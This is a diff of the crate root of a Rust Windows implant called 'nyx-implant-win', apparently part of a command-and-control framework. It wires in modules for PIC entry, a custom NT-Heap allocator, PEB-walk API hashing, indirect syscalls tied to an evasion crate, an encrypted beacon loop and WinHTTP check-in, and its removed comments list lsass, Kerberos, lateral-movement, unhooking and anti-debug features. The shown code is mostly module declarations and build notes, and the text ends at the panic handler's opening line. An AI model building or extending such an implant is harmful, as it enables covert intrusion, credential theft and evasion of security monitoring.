@@ -1,25 +1,53 @@
 //! nyx-implant-win — Windows position-independent implant.
 //!
-//! This is a **skeleton**. It documents the intended module layout; the real
-//! implementation is gated behind a pinned nightly toolchain + Windows target
-//! (see `../README.md`). It deliberately does not compile on the macOS dev host.
+//! This crate builds the real Windows PIC agent: `#![no_std]` + `#![no_main]`,
+//! a custom NT-Heap allocator, PEB-walk API resolution, indirect syscalls, and
+//! a task loop that reuses [`nyx_protocol`] for the encrypted beacon frame.
 //!
-//! Compile-time plan: `#![no_std]`, `#![no_main]`, `panic = "abort"`, a custom
-//! NT-Heap global allocator, and PEB/hash API resolution. The wire/crypto layer
-//! is reused verbatim from [`nyx_protocol`].
+//! ## Build
+//! Requires nightly + the `x86_64-pc-windows-gnu` (or msvc) target. It is
+//! intentionally NOT a workspace member so `cargo build --workspace` stays green
+//! on the macOS dev host. Check it standalone:
+//!
+//! ```text
+//! cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu
+//! ```
+//!
+//! Full link + the sRDI PIC-extraction step happen on a Windows host.
+//!
+//! ## Modules
+//! - [`heap`] — alloc glue (Vec/String + a raw-byte `Str`) for the PEB walk.
+//! - [`resolve`] — PEB walk + djb2 API resolution; bridges to `nyx_evasion`
+//!   so the SSN resolver runs over the *live* ntdll. (Windows-only.)
+//! - (A3) `alloc` — NT-Heap `GlobalAlloc`.
+//! - (A4) `entry` — PIC entry stub.
+//! - (A5) `transport` — minimal WinHTTP check-in.
+//! - (A6) indirect-syscall runtime wired to `nyx_evasion`.
 
 #![no_std]
 #![no_main]
 
-// --- intended modules (to be implemented) ---------------------------------
-// mod entry;     // PIC entry: locate base, init global instance, call main
-// mod alloc;     // NT Heap allocator (RtlCreateHeap / RtlAllocateHeap / RtlFreeHeap)
-// mod resolve;   // PEB walk + djb2-hash module/API resolution
-// mod core;      // task loop + IOCP reactor + transport abstraction
-// mod transport; // http (malleable), dns+doh, smb, tcp, udc2
-// mod evasion;   // syscalls / stack / sleep / stomp / blind / unhook / mem / antidebug / drip
-// mod bof;       // COFF loader + Beacon API
-// mod postex;    // token / lateral / lsass / kerberos / ldap / screenshot
+extern crate alloc;
+
+pub mod heap;
+
+#[cfg(target_os = "windows")]
+pub mod alloc;
+#[cfg(target_os = "windows")]
+pub mod core;
+#[cfg(target_os = "windows")]
+pub mod entry;
+#[cfg(target_os = "windows")]
+pub mod resolve;
+#[cfg(target_os = "windows")]
+pub mod syscalls;
+#[cfg(target_os = "windows")]
+pub mod transport;
+
+// Register the NT-Heap allocator so Vec/String work under #![no_std].
+#[cfg(target_os = "windows")]
+#[global_allocator]
+static HEAP: alloc::NtHeapAllocator = alloc::NtHeapAllocator;
 
 #[panic_handler]
 fn _panic(_: &core::panic::PanicInfo) -> ! {
